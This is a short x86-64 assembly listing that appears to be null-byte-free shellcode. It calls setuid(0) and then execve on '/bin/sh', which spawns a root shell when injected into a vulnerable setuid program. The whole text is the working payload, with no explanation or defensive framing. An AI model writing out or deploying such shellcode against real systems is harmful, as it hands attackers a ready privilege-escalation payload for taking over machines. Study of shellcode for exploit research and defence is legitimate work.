
global _start
 
_start:
 
xor rdi,rdi
xor rax,rax
mov al,0x69
syscall
 
xor rdx, rdx
mov rbx, 0x68732f6e69622fff
shr rbx, 0x8
push rbx
mov rdi, rsp
xor rax, rax
push rax
push rdi
mov rsi, rsp
mov al, 0x3b
syscall
